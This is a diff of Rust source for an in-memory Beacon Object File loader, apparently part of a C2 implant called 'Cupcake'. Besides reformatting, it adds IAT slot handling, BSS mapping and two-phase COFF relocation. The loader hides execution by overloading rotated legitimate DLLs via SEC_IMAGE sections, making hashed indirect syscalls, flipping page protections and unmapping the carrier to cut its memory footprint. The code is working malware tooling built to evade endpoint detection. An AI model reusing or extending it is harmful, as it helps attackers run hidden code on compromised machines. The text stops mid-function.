@@ -3,12 +3,12 @@
 // 负责解析、重定位并在内存中执行 COFF 格式插件。
 // 支持 x86 和 x64 架构
 
-use log::{debug, info, warn};
-use super::error::{BofError, BofResult};
 use super::beacon_api;
+use super::error::{BofError, BofResult};
 use super::safety;
-use std::sync::Mutex;
+use log::{debug, info, warn};
 use std::collections::HashMap;
+use std::sync::Mutex;
 
 // 符号缓存 - 避免重复解析相同符号
 lazy_static::lazy_static! {
@@ -16,22 +16,64 @@ lazy_static::lazy_static! {
 }
 
 // --- COFF 常量定义 ---
-const IMAGE_FILE_MACHINE_I386: u16 = 0x014c;  // x86 (32-bit)
+const IMAGE_FILE_MACHINE_I386: u16 = 0x014c; // x86 (32-bit)
 const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664; // x64 (64-bit)
 
 // x64 重定位类型
-const IMAGE_REL_AMD64_ADDR64: u16 = 1;   // 64位绝对地址
-const IMAGE_REL_AMD64_ADDR32: u16 = 2;   // 32位绝对地址
+const IMAGE_REL_AMD64_ADDR64: u16 = 1; // 64位绝对地址
+const IMAGE_REL_AMD64_ADDR32: u16 = 2; // 32位绝对地址
 const IMAGE_REL_AMD64_ADDR32NB: u16 = 3; // 32位相对于镜像基址
-const IMAGE_REL_AMD64_REL32: u16 = 4;    // 32位相对地址
+const IMAGE_REL_AMD64_REL32: u16 = 4; // 32位相对地址
+const IMAGE_REL_AMD64_REL32_1: u16 = 5;
+const IMAGE_REL_AMD64_REL32_2: u16 = 6;
+const IMAGE_REL_AMD64_REL32_3: u16 = 7;
+const IMAGE_REL_AMD64_REL32_4: u16 = 8;
+const IMAGE_REL_AMD64_REL32_5: u16 = 9;
+
+/// Per-execution IAT: `__imp_*` relocs need the **address of a pointer slot**,
+/// not the function VA (code is typically `call qword ptr [rip+rel]`).
+struct IatTable {
+    /// Stable storage for function pointers (never reallocated)
+    slots: Box<[usize; 512]>,
+    count: usize,
+    /// symbol name → slot index
+    index: HashMap<String, usize>,
+}
+
+impl IatTable {
+    fn new() -> Self {
+        Self {
+            slots: Box::new([0usize; 512]),
+            count: 0,
+            index: HashMap::new(),
+        }
+    }
+
+    /// Return address of the IAT slot that holds `fn_addr`.
+    fn slot_for(&mut self, name: &str, fn_addr: usize) -> usize {
+        if let Some(&idx) = self.index.get(name) {
+            self.slots[idx] = fn_addr;
+            return (&self.slots[idx] as *const usize) as usize;
+        }
+        if self.count >= self.slots.len() {
+            warn!("[!] IAT table full, cannot resolve {}", name);
+            return 0;
+        }
+        let idx = self.count;
+        self.slots[idx] = fn_addr;
+        self.count += 1;
+        self.index.insert(name.to_string(), idx);
+        (&self.slots[idx] as *const usize) as usize
+    }
+}
 
 // x86 重定位类型
 #[allow(dead_code)]
-const IMAGE_REL_I386_DIR32: u16 = 6;     // 32位绝对地址
+const IMAGE_REL_I386_DIR32: u16 = 6; // 32位绝对地址
 #[allow(dead_code)]
-const IMAGE_REL_I386_DIR32NB: u16 = 7;   // 32位相对于镜像基址
+const IMAGE_REL_I386_DIR32NB: u16 = 7; // 32位相对于镜像基址
 #[allow(dead_code)]
-const IMAGE_REL_I386_REL32: u16 = 20;    // 32位相对地址
+const IMAGE_REL_I386_REL32: u16 = 20; // 32位相对地址
 
 // --- COFF 结构体定义 ---
 #[repr(C, packed)]
@@ -105,7 +147,10 @@ impl BofLoader {
 
     /// 加载并运行一个 BOF 插件
     pub async fn execute(coff_data: &[u8], args: &[u8]) -> BofResult<String> {
-        info!("[*] Cupcake BOF Engine: Loading plugin ({} bytes)", coff_data.len());
+        info!(
+            "[*] Cupcake BOF Engine: Loading plugin ({} bytes)",
+            coff_data.len()
+        );
 
         // Reset output
         beacon_api::clear_bof_output();
@@ -114,9 +159,7 @@ impl BofLoader {
         super::safety::validate_coff_header(coff_data)?;
 
         // 安全地读取文件头
-        let header = unsafe {
-            super::safety::read_packed_struct::<CoffFileHeader>(coff_data, 0)?
-        };
+        let header = unsafe { super::safety::read_packed_struct::<CoffFileHeader>(coff_data, 0)? };
 
         // 验证段表
         super::safety::validate_section_table(
@@ -154,7 +197,11 @@ impl BofLoader {
     }
 
     /// 执行 x64 BOF（同步；由 execute 外包 stack spoof）
-    fn execute_x64_sync(coff_data: &[u8], args: &[u8], header: &CoffFileHeader) -> BofResult<String> {
+    fn execute_x64_sync(
+        coff_data: &[u8],
+        args: &[u8],
+        header: &CoffFileHeader,
+    ) -> BofResult<String> {
         unsafe {
             // 1. True Module Overloading: rotate carrier DLLs (avoid single known xpsprint fingerprint)
             let base_addr = Self::map_rotated_carrier(false)?;
@@ -166,7 +213,9 @@ impl BofLoader {
 
             // 验证 DOS 头
             if base_addr == 0 {
-                return Err(BofError::MemoryAllocationFailed("Invalid base address".to_string()));
+                return Err(BofError::MemoryAllocationFailed(
+                    "Invalid base address".to_string(),
+                ));
             }
 
             let dos_header = base_addr as *const IMAGE_DOS_HEADER;
@@ -174,7 +223,9 @@ impl BofLoader {
 
             // 验证 NT 头偏移
             if e_lfanew < 0 || e_lfanew as usize > 0x1000 {
-                return Err(BofError::InvalidCoffFormat("Invalid PE header offset".to_string()));
+                return Err(BofError::InvalidCoffFormat(
+                    "Invalid PE header offset".to_string(),
+                ));
             }
 
             let nt_headers = (base_addr + e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
@@ -182,12 +233,14 @@ impl BofLoader {
 
             // 验证段数量
             if section_count == 0 || section_count > 96 {
-                return Err(BofError::InvalidCoffFormat(
-                    format!("Invalid section count: {}", section_count)
-                ));
+                return Err(BofError::InvalidCoffFormat(format!(
+                    "Invalid section count: {}",
+                    section_count
+                )));
             }
 
-            let section_headers = (nt_headers as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
+            let section_headers = (nt_headers as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
+                as *const IMAGE_SECTION_HEADER;
 
             let mut carrier_text_addr = 0;
             let mut carrier_text_size = 0;
@@ -199,9 +252,10 @@ impl BofLoader {
 
                     // 验证段大小
                     if carrier_text_size == 0 || carrier_text_size > 0x10000000 {
-                        return Err(BofError::InvalidCoffFormat(
-                            format!("Invalid .text section size: 0x{:X}", carrier_text_size)
-                        ));
+                        return Err(BofError::InvalidCoffFormat(format!(
+                            "Invalid .text section size: 0x{:X}",
+                            carrier_text_size
+                        )));
                     }
                     break;
                 }
@@ -216,125 +270,176 @@ impl BofLoader {
             let hash_nt_protect = crate::stealth::hash_api_name(b"NtProtectVirtualMemory");
             let mut region_size = carrier_text_size;
             let mut protect_addr = carrier_text_addr;
-            crate::syscalls::indirect_syscall(hash_nt_protect, &[
-                0xFFFFFFFFFFFFFFFFu64 as usize,
-                &mut protect_addr as *mut _ as usize,
-                &mut region_size as *mut _ as usize,
-                0x04, // PAGE_READWRITE
-                &mut old_protect as *mut _ as usize,
-            ]);
-
-            // 4. 解析 BOF 段并写入载体内存 (此处简化：将所有代码段合并写入)
-            let section_header_offset = std::mem::size_of::<CoffFileHeader>();
-
-            // 验证段表偏移
-            safety::validate_section_table(coff_data, section_header_offset, header.number_of_sections)?;
-
-            let bof_sections = (coff_data.as_ptr() as usize + section_header_offset) as *const CoffSectionHeader;
-            let mut entry_point_addr = 0;
-
-            // 验证符号表
-            safety::validate_symbol_table(coff_data, header.pointer_to_symbol_table, header.number_of_symbols)?;
-
-            // 符号表和字符串表
-            let symbols = std::slice::from_raw_parts(
-                (coff_data.as_ptr() as usize + header.pointer_to_symbol_table as usize) as *const CoffSymbol,
-                header.number_of_symbols as usize
+            crate::syscalls::indirect_syscall(
+                hash_nt_protect,
+                &[
+                    0xFFFFFFFFFFFFFFFFu64 as usize,
+                    &mut protect_addr as *mut _ as usize,
+                    &mut region_size as *mut _ as usize,
+                    0x04, // PAGE_READWRITE
+                    &mut old_protect as *mut _ as usize,
+                ],
             );
-            let string_table = (coff_data.as_ptr() as usize + header.pointer_to_symbol_table as usize + (header.number_of_symbols * 18) as usize) as *const u8;
 
-            // 遍历并复制段
+            // 4. Parse BOF sections — section table is after optional header
+            let section_header_offset =
+                std::mem::size_of::<CoffFileHeader>() + header.size_of_optional_header as usize;
+
+            safety::validate_section_table(
+                coff_data,
+                section_header_offset,
+                header.number_of_sections,
+            )?;
+
+            let bof_sections =
+                (coff_data.as_ptr() as usize + section_header_offset) as *const CoffSectionHeader;
+
+            safety::validate_symbol_table(
+                coff_data,
+                header.pointer_to_symbol_table,
+                header.number_of_symbols,
+            )?;
+
+            let symbols = std::slice::from_raw_parts(
+                (coff_data.as_ptr() as usize + header.pointer_to_symbol_table as usize)
+                    as *const CoffSymbol,
+                header.number_of_symbols as usize,
+            );
+            let string_table = (coff_data.as_ptr() as usize
+                + header.pointer_to_symbol_table as usize
+                + (header.number_of_symbols * 18) as usize)
+                as *const u8;
+
+            // Phase 1: map all sections (including BSS / zero-raw)
             let mut current_offset: usize = 0;
             let mut section_map = std::collections::HashMap::new();
+            let mut pending_relocs: Vec<(usize, u32, u16)> = Vec::new(); // (dest_base, reloc_ptr, count)
 
             for i in 0..header.number_of_sections {
                 let sec = &*bof_sections.add(i as usize);
-                if sec.size_of_raw_data == 0 { continue; }
-
-                // 验证段数据偏移和大小
-                let raw_data_offset = sec.pointer_to_raw_data as usize;
                 let raw_data_size = sec.size_of_raw_data as usize;
-
-                if raw_data_offset.checked_add(raw_data_size).ok_or_else(|| {
-                    BofError::BoundsCheckFailed { offset: raw_data_offset, size: coff_data.len() }
-                })? > coff_data.len() {
-                    return Err(BofError::BoundsCheckFailed {
-                        offset: raw_data_offset + raw_data_size,
-                        size: coff_data.len(),
-                    });
+                // VirtualSize lives in misc for COFF/PE section headers
+                let virtual_size = sec.misc as usize;
+                let alloc_size = virtual_size.max(raw_data_size);
+                if alloc_size == 0 {
+                    continue;
                 }
 
-                // 验证目标地址不会溢出载体 .text 段
-                if current_offset.checked_add(raw_data_size).ok_or_else(|| {
+                if current_offset.checked_add(alloc_size).ok_or_else(|| {
                     BofError::InvalidCoffFormat("Section offset overflow".to_string())
-                })? > carrier_text_size {
-                    return Err(BofError::InvalidCoffFormat(
-                        format!("BOF sections exceed carrier .text size (0x{:X} > 0x{:X})",
-                            current_offset + raw_data_size, carrier_text_size)
-                    ));
+                })? > carrier_text_size
+                {
+                    return Err(BofError::InvalidCoffFormat(format!(
+                        "BOF sections exceed carrier .text size (0x{:X} > 0x{:X})",
+                        current_offset + alloc_size,
+                        carrier_text_size
+                    )));
                 }
 
-                let src = coff_data.as_ptr().add(raw_data_offset);
                 let dest = (carrier_text_addr + current_offset) as *mut u8;
+                // Zero full virtual span (BSS + padding)
+                std::ptr::write_bytes(dest, 0, alloc_size);
 
-                // 使用安全的内存复制
-                safety::safe_copy_memory(
-                    dest,
-                    src,
-                    raw_data_size,
-                    carrier_text_addr,
-                    carrier_text_size,
-                )?;
+                if raw_data_size > 0 {
+                    let raw_data_offset = sec.pointer_to_raw_data as usize;
+                    if raw_data_offset.checked_add(raw_data_size).ok_or_else(|| {
+                        BofError::BoundsCheckFailed {
+                            offset: raw_data_offset,
+                            size: coff_data.len(),
+                        }
+                    })? > coff_data.len()
+                    {
+                        return Err(BofError::BoundsCheckFailed {
+                            offset: raw_data_offset + raw_data_size,
+                            size: coff_data.len(),
+                        });
+                    }
+                    let src = coff_data.as_ptr().add(raw_data_offset);
+                    safety::safe_copy_memory(
+                        dest,
+                        src,
+                        raw_data_size,
+                        carrier_text_addr,
+                        carrier_text_size,
+                    )?;
+                }
 
                 section_map.insert(i + 1, dest as usize); // 1-indexed
 
-                // 处理重定位
                 if sec.number_of_relocations > 0 {
-                    // 验证重定位表
                     safety::validate_relocation_table(
                         coff_data,
                         sec.pointer_to_relocations,
                         sec.number_of_relocations,
                     )?;
-
-                    let relocs = std::slice::from_raw_parts(
-                        (coff_data.as_ptr() as usize + sec.pointer_to_relocations as usize) as *const CoffRelocation,
-                        sec.number_of_relocations as usize
-                    );
-                    Self::patch_symbols(dest, relocs, symbols, string_table, &section_map);
+                    pending_relocs.push((
+                        dest as usize,
+                        sec.pointer_to_relocations,
+                        sec.number_of_relocations,
+                    ));
                 }
 
-                current_offset += raw_data_size;
+                current_offset += alloc_size;
             }
 
-            // 5. 查找 'go' 符号作为入口点
-            for sym in symbols {
+            // Phase 2: apply all relocations with full section_map + IAT
+            let mut iat = IatTable::new();
+            for (dest_base, reloc_off, reloc_count) in pending_relocs {
+                let relocs = std::slice::from_raw_parts(
+                    (coff_data.as_ptr() as usize + reloc_off as usize) as *const CoffRelocation,
+                    reloc_count as usize,
+                );
+                Self::patch_symbols(
+                    dest_base as *mut u8,
+                    relocs,
+                    symbols,
+                    string_table,
+                    &section_map,
+                    &mut iat,
+                );
+            }
+
+            // 5. Entry: go / _go (skip AUX records)
+            let mut entry_point_addr = 0usize;
+            let mut si = 0usize;
+            while si < symbols.len() {
+                let sym = &symbols[si];
                 let name = Self::get_symbol_name(sym, string_table);
-                if name == "go" {
-                    entry_point_addr = section_map.get(&(sym.section_number as u16)) .unwrap_or(&0) + sym.value as usize;
-                    break;
+                if name == "go" || name == "_go" {
+                    let base = *section_map.get(&(sym.section_number as u16)).unwrap_or(&0);
+                    if base != 0 {
+                        entry_point_addr = base + sym.value as usize;
+                        break;
+                    }
                 }
+                si += 1 + sym.num_aux as usize;
             }
 
-            // 6. 恢复 RX 并执行
-            crate::syscalls::indirect_syscall(hash_nt_protect, &[
-                0xFFFFFFFFFFFFFFFFu64 as usize,
-                &mut protect_addr as *mut _ as usize,
-                &mut region_size as *mut _ as usize,
-                0x20, // PAGE_EXECUTE_READ
-                &mut old_protect as *mut _ as usize,
-            ]);
-
-            if entry_point_addr != 0 {
-                let go: extern "C" fn(*const u8, i32) = std::mem::transmute(entry_point_addr);
-                go(args.as_ptr(), args.len() as i32);
+            if entry_point_addr == 0 {
+                Self::release_carrier_mapping(base_addr);
+                return Err(BofError::EntryPointNotFound("go".to_string()));
             }
+
+            // 6. Restore RX and execute
+            crate::syscalls::indirect_syscall(
+                hash_nt_protect,
+                &[
+                    0xFFFFFFFFFFFFFFFFu64 as usize,
+                    &mut protect_addr as *mut _ as usize,
+                    &mut region_size as *mut _ as usize,
+                    0x20, // PAGE_EXECUTE_READ
+                    &mut old_protect as *mut _ as usize,
+                ],
+            );
+
+            let go: extern "C" fn(*const u8, i32) = std::mem::transmute(entry_point_addr);
+            go(args.as_ptr(), args.len() as i32);
+
+            // Keep IAT slots alive until after go() returns
+            let _ = iat;
 
             let out = beacon_api::get_bof_output();
-
-            // Unmap / zero carrier after BOF (reduce VAD footprint)
             Self::release_carrier_mapping(base_addr);
-
             Ok(out)
         }
     }
@@ -372,7 +477,11 @@ impl BofLoader {
     }
 
     /// 执行 x86 BOF (32位)
-    fn execute_x86_sync(_coff_data: &[u8], _args: &[u8], _header: &CoffFileHeader) -> BofResult<String> {
+    fn execute_x86_sync(
+        _coff_data: &[u8],
+        _args: &[u8],
+        _header: &CoffFileHeader,
+    ) -> BofResult<String> {
         #[cfg(target_arch = "x86_64")]
         {
             return Err(BofError::architecture_mismatch("x86", "x64"));
@@ -391,8 +500,10 @@ impl BofLoader {
             // 2. 定位载体 DLL 的 .text 段
             use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER};
             let dos_header = base_addr as *const IMAGE_DOS_HEADER;
-            let nt_headers = (base_addr + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS32;
-            let section_headers = (nt_headers as usize + std::mem::size_of::<IMAGE_NT_HEADERS32>()) as *const IMAGE_SECTION_HEADER;
+            let nt_headers =
+                (base_addr + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS32;
+            let section_headers = (nt_headers as usize + std::mem::size_of::<IMAGE_NT_HEADERS32>())
+                as *const IMAGE_SECTION_HEADER;
 
             let mut carrier_text_addr = 0;
             let mut carrier_text_size = 0;
@@ -414,120 +525,164 @@ impl BofLoader {
             let hash_nt_protect = crate::stealth::hash_api_name(b"NtProtectVirtualMemory");
             let mut region_size = carrier_text_size;
             let mut protect_addr = carrier_text_addr;
-            crate::syscalls::indirect_syscall(hash_nt_protect, &[
-                0xFFFFFFFFu32 as usize, // NtCurrentProcess for x86
-                &mut protect_addr as *mut _ as usize,
-                &mut region_size as *mut _ as usize,
-                0x04, // PAGE_READWRITE
-                &mut old_protect as *mut _ as usize,
-            ]);
-
-            // 4. 解析 BOF 段并写入载体内存
-            let section_header_offset = std::mem::size_of::<CoffFileHeader>();
-
-            // 验证段表偏移
-            safety::validate_section_table(coff_data, section_header_offset, header.number_of_sections)?;
-
-            let bof_sections = (coff_data.as_ptr() as usize + section_header_offset) as *const CoffSectionHeader;
-            let mut entry_point_addr = 0;
-
-            // 验证符号表
-            safety::validate_symbol_table(coff_data, header.pointer_to_symbol_table, header.number_of_symbols)?;
-
-            // 符号表和字符串表
-            let symbols = std::slice::from_raw_parts(
-                (coff_data.as_ptr() as usize + header.pointer_to_symbol_table as usize) as *const CoffSymbol,
-                header.number_of_symbols as usize
+            crate::syscalls::indirect_syscall(
+                hash_nt_protect,
+                &[
+                    0xFFFFFFFFu32 as usize, // NtCurrentProcess for x86
+                    &mut protect_addr as *mut _ as usize,
+                    &mut region_size as *mut _ as usize,
+                    0x04, // PAGE_READWRITE
+                    &mut old_protect as *mut _ as usize,
+                ],
             );
-            let string_table = (coff_data.as_ptr() as usize + header.pointer_to_symbol_table as usize + (header.number_of_symbols * 18) as usize) as *const u8;
 
-            // 遍历并复制段
+            // 4. Section table after optional header; two-phase map + x86 reloc
+            let section_header_offset =
+                std::mem::size_of::<CoffFileHeader>() + header.size_of_optional_header as usize;
+
+            safety::validate_section_table(
+                coff_data,
+                section_header_offset,
+                header.number_of_sections,
+            )?;
+
+            let bof_sections =
+                (coff_data.as_ptr() as usize + section_header_offset) as *const CoffSectionHeader;
+
+            safety::validate_symbol_table(
+                coff_data,
+                header.pointer_to_symbol_table,
+                header.number_of_symbols,
+            )?;
+
+            let symbols = std::slice::from_raw_parts(
+                (coff_data.as_ptr() as usize + header.pointer_to_symbol_table as usize)
+                    as *const CoffSymbol,
+                header.number_of_symbols as usize,
+            );
+            let string_table = (coff_data.as_ptr() as usize
+                + header.pointer_to_symbol_table as usize
+                + (header.number_of_symbols * 18) as usize)
+                as *const u8;
+
             let mut current_offset: usize = 0;
             let mut section_map = std::collections::HashMap::new();
+            let mut pending_relocs: Vec<(usize, u32, u16)> = Vec::new();
 
             for i in 0..header.number_of_sections {
                 let sec = &*bof_sections.add(i as usize);
-                if sec.size_of_raw_data == 0 { continue; }
-
-                // 验证段数据偏移和大小
-                let raw_data_offset = sec.pointer_to_raw_data as usize;
                 let raw_data_size = sec.size_of_raw_data as usize;
-
-                if raw_data_offset.checked_add(raw_data_size).ok_or_else(|| {
-                    BofError::BoundsCheckFailed { offset: raw_data_offset, size: coff_data.len() }
-                })? > coff_data.len() {
-                    return Err(BofError::BoundsCheckFailed {
-                        offset: raw_data_offset + raw_data_size,
-                        size: coff_data.len(),
-                    });
+                let virtual_size = sec.misc as usize;
+                let alloc_size = virtual_size.max(raw_data_size);
+                if alloc_size == 0 {
+                    continue;
                 }
 
-                // 验证目标地址不会溢出载体 .text 段
-                if current_offset.checked_add(raw_data_size).ok_or_else(|| {
+                if current_offset.checked_add(alloc_size).ok_or_else(|| {
                     BofError::InvalidCoffFormat("Section offset overflow".to_string())
-                })? > carrier_text_size {
-                    return Err(BofError::InvalidCoffFormat(
-                        format!("BOF sections exceed carrier .text size (0x{:X} > 0x{:X})",
-                            current_offset + raw_data_size, carrier_text_size)
-                    ));
+                })? > carrier_text_size
+                {
+                    return Err(BofError::InvalidCoffFormat(format!(
+                        "BOF sections exceed carrier .text size (0x{:X} > 0x{:X})",
+                        current_offset + alloc_size,
+                        carrier_text_size
+                    )));
                 }
 
-                let src = coff_data.as_ptr().add(raw_data_offset);
                 let dest = (carrier_text_addr + current_offset) as *mut u8;
+                std::ptr::write_bytes(dest, 0, alloc_size);
 
-                // 使用安全的内存复制
-                safety::safe_copy_memory(
-                    dest,
-                    src,
-                    raw_data_size,
-                    carrier_text_addr,
-                    carrier_text_size,
-                )?;
+                if raw_data_size > 0 {
+                    let raw_data_offset = sec.pointer_to_raw_data as usize;
+                    if raw_data_offset.checked_add(raw_data_size).ok_or_else(|| {
+                        BofError::BoundsCheckFailed {
+                            offset: raw_data_offset,
+                            size: coff_data.len(),
+                        }
+                    })? > coff_data.len()
+                    {
+                        return Err(BofError::BoundsCheckFailed {
+                            offset: raw_data_offset + raw_data_size,
+                            size: coff_data.len(),
+                        });
+                    }
+                    let src = coff_data.as_ptr().add(raw_data_offset);
+                    safety::safe_copy_memory(
+                        dest,
+                        src,
+                        raw_data_size,
+                        carrier_text_addr,
+                        carrier_text_size,
+                    )?;
+                }
 
-                section_map.insert(i + 1, dest as usize); // 1-indexed
+                section_map.insert(i + 1, dest as usize);
 
-                // 处理重定位
                 if sec.number_of_relocations > 0 {
-                    // 验证重定位表
                     safety::validate_relocation_table(
                         coff_data,
                         sec.pointer_to_relocations,
                         sec.number_of_relocations,
                     )?;
-
-                    let relocs = std::slice::from_raw_parts(
-                        (coff_data.as_ptr() as usize + sec.pointer_to_relocations as usize) as *const CoffRelocation,
-                        sec.number_of_relocations as usize
-                    );
-                    Self::patch_symbols(dest, relocs, symbols, string_table, &section_map);
+                    pending_relocs.push((
+                        dest as usize,
+                        sec.pointer_to_relocations,
+                        sec.number_of_relocations,
+                    ));
                 }
 
-                current_offset += raw_data_size;
+                current_offset += alloc_size;
             }
 
-            // 5. 查找 'go' 符号作为入口点
-            for sym in symbols {
+            let mut iat = IatTable::new();
+            for (dest_base, reloc_off, reloc_count) in pending_relocs {
+                let relocs = std::slice::from_raw_parts(
+                    (coff_data.as_ptr() as usize + reloc_off as usize) as *const CoffRelocation,
+                    reloc_count as usize,
+                );
+                Self::patch_symbols_x86(
+                    dest_base as *mut u8,
+                    relocs,
+                    symbols,
+                    string_table,
+                    &section_map,
+                    &mut iat,
+                );
+            }
+
+            let mut entry_point_addr = 0usize;
+            let mut si = 0usize;
+            while si < symbols.len() {
+                let sym = &symbols[si];
                 let name = Self::get_symbol_name(sym, string_table);
-                if name == "go" {
-                    entry_point_addr = section_map.get(&(sym.section_number as u16)).unwrap_or(&0) + sym.value as usize;
-                    break;
+                if name == "go" || name == "_go" {
+                    let base = *section_map.get(&(sym.section_number as u16)).unwrap_or(&0);
+                    if base != 0 {
+                        entry_point_addr = base + sym.value as usize;
+                        break;
+                    }
                 }
+                si += 1 + sym.num_aux as usize;
             }
 
-            // 6. 恢复 RX 并执行
-            crate::syscalls::indirect_syscall(hash_nt_protect, &[
-                0xFFFFFFFFu32 as usize,
-                &mut protect_addr as *mut _ as usize,
-                &mut region_size as *mut _ as usize,
-                0x20, // PAGE_EXECUTE_READ
-                &mut old_protect as *mut _ as usize,
-            ]);
-
-            if entry_point_addr != 0 {
-                // x86 使用 cdecl 调用约定
-                let go: extern "cdecl" fn(*const u8, i32) = std::mem::transmute(entry_point_addr);
-                go(args.as_ptr(), args.len() as i32);
+            if entry_point_addr == 0 {
+                return Err(BofError::EntryPointNotFound("go".to_string()));
             }
+
+            crate::syscalls::indirect_syscall(
+                hash_nt_protect,
+                &[
+                    0xFFFFFFFFu32 as usize,
+                    &mut protect_addr as *mut _ as usize,
+                    &mut region_size as *mut _ as usize,
+                    0x20, // PAGE_EXECUTE_READ
+                    &mut old_protect as *mut _ as usize,
+                ],
+            );
+
+            let go: extern "cdecl" fn(*const u8, i32) = std::mem::transmute(entry_point_addr);
+            go(args.as_ptr(), args.len() as i32);
+            let _ = iat;
 
             Ok(beacon_api::get_bof_output())
         }
@@ -535,8 +690,12 @@ impl BofLoader {
 
     /// True Module Overloading: 利用 SEC_IMAGE 映射合法 DLL
     unsafe fn module_overload_map(path: &str) -> BofResult<usize> {
-        use winapi::shared::ntdef::{OBJECT_ATTRIBUTES, UNICODE_STRING, InitializeObjectAttributes, HANDLE, NULL};
-        use winapi::um::winnt::{FILE_GENERIC_READ, PAGE_READONLY, SEC_IMAGE, SECTION_MAP_READ, SECTION_MAP_EXECUTE};
+        use winapi::shared::ntdef::{
+            InitializeObjectAttributes, HANDLE, NULL, OBJECT_ATTRIBUTES, UNICODE_STRING,
+        };
+        use winapi::um::winnt::{
+            FILE_GENERIC_READ, PAGE_READONLY, SECTION_MAP_EXECUTE, SECTION_MAP_READ, SEC_IMAGE,
+        };
 
         // 1. 将路径转换为 UNICODE_STRING
         let mut path_u16: Vec<u16> = path.encode_utf16().collect();
@@ -554,34 +713,44 @@ impl BofLoader {
         let mut h_file: HANDLE = NULL;
         let mut io_status: [usize; 2] = [0, 0];
         let hash_nt_open_file = crate::stealth::hash_api_name(b"NtOpenFile");
-        let status = crate::syscalls::indirect_syscall(hash_nt_open_file, &[
-            &mut h_file as *mut _ as usize,
-            FILE_GENERIC_READ as usize,
-            &mut obj_attr as *mut _ as usize,
-            &mut io_status as *mut _ as usize,
-            1, // FILE_SHARE_READ
-            0x20, // FILE_NON_DIRECTORY_FILE
-        ]);
+        let status = crate::syscalls::indirect_syscall(
+            hash_nt_open_file,
+            &[
+                &mut h_file as *mut _ as usize,
+                FILE_GENERIC_READ as usize,
+                &mut obj_attr as *mut _ as usize,
+                &mut io_status as *mut _ as usize,
+                1,    // FILE_SHARE_READ
+                0x20, // FILE_NON_DIRECTORY_FILE
+            ],
+        );
 
-        if status as i32 != 0 { // STATUS_SUCCESS is 0
+        if status as i32 != 0 {
+            // STATUS_SUCCESS is 0
             return Err(BofError::syscall_failed("NtOpenFile", status));
         }
 
         // 3. NtCreateSection (SEC_IMAGE)
         let mut h_section: HANDLE = NULL;
         let hash_nt_create_section = crate::stealth::hash_api_name(b"NtCreateSection");
-        let status = crate::syscalls::indirect_syscall(hash_nt_create_section, &[
-            &mut h_section as *mut _ as usize,
-            (SECTION_MAP_READ | SECTION_MAP_EXECUTE) as usize,
-            std::ptr::null_mut::<usize>() as usize, // ObjectAttributes
-            std::ptr::null_mut::<usize>() as usize, // MaximumSize
-            PAGE_READONLY as usize,
-            SEC_IMAGE as usize,
-            h_file as usize,
-        ]);
+        let status = crate::syscalls::indirect_syscall(
+            hash_nt_create_section,
+            &[
+                &mut h_section as *mut _ as usize,
+                (SECTION_MAP_READ | SECTION_MAP_EXECUTE) as usize,
+                std::ptr::null_mut::<usize>() as usize, // ObjectAttributes
+                std::ptr::null_mut::<usize>() as usize, // MaximumSize
+                PAGE_READONLY as usize,
+                SEC_IMAGE as usize,
+                h_file as usize,
+            ],
+        );
 
         if status as i32 != 0 {
-            let _ = crate::syscalls::indirect_syscall(crate::stealth::hash_api_name(b"NtClose"), &[h_file as usize]);
+            let _ = crate::syscalls::indirect_syscall(
+                crate::stealth::hash_api_name(b"NtClose"),
+                &[h_file as usize],
+            );
             return Err(BofError::syscall_failed("NtCreateSection", status));
         }
 
@@ -589,22 +758,31 @@ impl BofLoader {
         let mut base_addr: usize = 0;
         let mut view_size: usize = 0;
         let hash_nt_map_view = crate::stealth::hash_api_name(b"NtMapViewOfSection");
-        let status = crate::syscalls::indirect_syscall(hash_nt_map_view, &[
-            h_section as usize,
-            0xFFFFFFFFFFFFFFFFu64 as usize, // NtCurrentProcess
-            &mut base_addr as *mut _ as usize,
-            0, // ZeroBits
-            0, // CommitSize
-            0, // SectionOffset
-            &mut view_size as *mut _ as usize,
-            1, // ViewShare (InheritDisposition)
-            0, // AllocationType
-            PAGE_READONLY as usize,
-        ]);
+        let status = crate::syscalls::indirect_syscall(
+            hash_nt_map_view,
+            &[
+                h_section as usize,
+                0xFFFFFFFFFFFFFFFFu64 as usize, // NtCurrentProcess
+                &mut base_addr as *mut _ as usize,
+                0, // ZeroBits
+                0, // CommitSize
+                0, // SectionOffset
+                &mut view_size as *mut _ as usize,
+                1, // ViewShare (InheritDisposition)
+                0, // AllocationType
+                PAGE_READONLY as usize,
+            ],
+        );
 
         // Cleanup handles
-        let _ = crate::syscalls::indirect_syscall(crate::stealth::hash_api_name(b"NtClose"), &[h_section as usize]);
-        let _ = crate::syscalls::indirect_syscall(crate::stealth::hash_api_name(b"NtClose"), &[h_file as usize]);
+        let _ = crate::syscalls::indirect_syscall(
+            crate::stealth::hash_api_name(b"NtClose"),
+            &[h_section as usize],
+        );
+        let _ = crate::syscalls::indirect_syscall(
+            crate::stealth::hash_api_name(b"NtClose"),
+            &[h_file as usize],
+        );
 
         if status as i32 != 0 {
             return Err(BofError::syscall_failed("NtMapViewOfSection", status));
@@ -665,6 +843,22 @@ impl BofLoader {
         (index as usize) < symbol_count
     }
 
+    /// Resolve an external / Beacon symbol to a **function VA**.
+    fn resolve_symbol_fn(name: &str) -> usize {
+        if let Some(rest) = name.strip_prefix("__imp_") {
+            // __imp_BeaconPrintf / __imp__BeaconPrintf
+            let clean = rest.trim_start_matches('_');
+            if clean.starts_with("Beacon") {
+                return Self::resolve_internal_beacon(clean);
+            }
+            return Self::resolve_external(name);
+        }
+        if name.starts_with("Beacon") || name.trim_start_matches('_').starts_with("Beacon") {
+            return Self::resolve_internal_beacon(name.trim_start_matches('_'));
+        }
+        Self::resolve_external(name)
+    }
+
     /// 核心符号修复逻辑 (Symbol Patching) - x64 版本
     unsafe fn patch_symbols(
         section_base: *mut u8,
@@ -672,6 +866,7 @@ impl BofLoader {
         symbols: &[CoffSymbol],
         string_table: *const u8,
         section_map: &std::collections::HashMap<u16, usize>,
+        iat: &mut IatTable,
     ) {
         for reloc in relocs {
             let idx = reloc.symbol_table_index as usize;
@@ -687,40 +882,72 @@ impl BofLoader {
             let name = Self::get_symbol_name(symbol, string_table);
 
             let target_addr = if symbol.section_number > 0 {
